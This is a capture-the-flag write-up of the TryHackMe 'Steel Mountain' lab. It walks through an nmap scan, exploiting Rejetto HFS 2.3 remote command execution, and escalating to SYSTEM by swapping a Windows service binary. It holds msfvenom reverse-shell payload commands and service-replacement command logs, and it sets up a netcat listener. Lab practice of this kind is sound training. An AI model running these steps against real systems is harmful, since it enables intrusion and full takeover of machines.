---
layout: post
title: THM Steel Mountain
---

This is a write up for the room [Steel Mountain](https://tryhackme.com/room/steelmountain) from [tryhackme](https://tryhackme.com)

## Service Enumeration

Server IP Address: 10.10.23.54
Open Ports: 80, 135, 139, 445, 3389, 8080, 49152-41955, 49157, 49163

### Nmap Scan Results
````shell
# Nmap 7.91 scan initiated Wed Jan 20 17:52:34 2021 as: nmap -sC -sV -Pn -oA nmap/nmap.ini 10.10.23.54
Nmap scan report for 10.10.23.54
Host is up (0.051s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesnt have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2020-10-11T19:04:29
|_Not valid after:  2021-04-12T19:04:29
|_ssl-date: 2021-01-20T16:53:42+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:e6:f7:15:d7:a5 (unknown)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-20T16:53:36
|_  start_date: 2021-01-20T16:49:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 20 17:53:42 2021 -- 1 IP address (1 host up) scanned in 68.24 seconds
````
Connecting to the service at port 80 with our web browser we can see the picture of the employee of the month.

![Employee of the month](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm1.png "Employee of the month")

If we look at the source code we have the name

![Source code](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm2.png "First question")

## Initial Shell Vulnerability Exploited

If we navigate to port 8080 with a web browser we find this service

![Service in port 8080](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm3.png "Service in port 8080")

### Vulnerability Explanation

According to [this site](https://www.kb.cert.org/vuls/id/251276)

Rejetto HttpFileServer (HFS) versions 2.3, 2.3a, and 2.3b are vulnerable to remote command execution due to a regular expression in parserLib.pas that fails to handle null bytes. Commands that follow a null byte in the search string are executed in the host system.

### Vulnerability Fix

Apply an update. This issue is addressed in HFS version 2.3c and later, available [here](http://www.rejetto.com/hfs/?f=dl)
### Severity

Critical

### Proof of Concept Code Here

In this case we use metasploit framework to gain a shell into the system. We have to set up the options `rhosts` and `rport` to match the machine ip and port of the service.

![Meterpreter session](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm4.png "Meterpreter session")

And we can obtain the user flag.

![User flag](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm5.png "User flag")

## Privilege Escalation

To enumerate this machine we are going to use a powershell script called `PowerUp`. We download it from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).

We upload the file to the remote machine with the `upload` command in the meterpreter session, we type `load powershell` to access a poweshell shell and run the script as follows

````shell
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
````
### Vulnerability Exploited

The output of the previous command gives us this information about this windows service

![Exploitable Windows Service](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm6.png "Exploitable windows service")

### Vulnerability Explanation

The remote Windows host has one service with weak file permissions, allowing a
local attacker to gain elevated privileges rewriting it and restarting the service.

### Vulnerability Fix

Ensure that any service executable has the proper permissions.

### Severity

Critical

### Exploit Code

We use `msfvenom` to generate a reverse shell as a Windows executable

````shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.23.211 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
````
We start a listener on port 4443, go back the the meterpreter session, upload the file created, stop the service, replace the file and restart the service as follows

````shell
meterpreter > shell
Process 3840 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc start AdvancedSystemcareService9
sc start AdvancedSystemcareService9
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
````

We receive a shell with elevated privileges, and can read the root flag

![Root flag](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/steelmountain/sm7.png "Root flag")

## Access and privilege escalation without Metasploit

We use this [exploit](https://www.exploit-db.com/exploits/39161) to gain access to the machine. Previously we need to copy a `nc.exe` binary to the working directory and create a web server with python to serve the content. After that we need to change the `local ip` in the exploit to match ours. Once all is set up we need a listener to the port indicated in the exploit and we have to run the exploit twice to obtain a shell.

Once into the system we can do manual enumeration or use `winPEAS` to detect the vulnerability previously exploited. In this case we use a `msfvenom` payload to create a malicious binary to substitute the service executable with.
````shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.23.211 LPORT=4444 -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
````
We serve it with the same web server previously used, and download it to the remote system with powershell. Then we stop the service, rewrite the executable, set up a listener for the LPORT selected and start the service again like this

````shell
c:\Users\bill>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Users\bill>copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced Systemcare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.

c:\Users\bill>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
````
And we obtain a shell with elevated privileges.

````shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.23.211] from (UNKNOWN) [10.10.34.8] 49247
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
````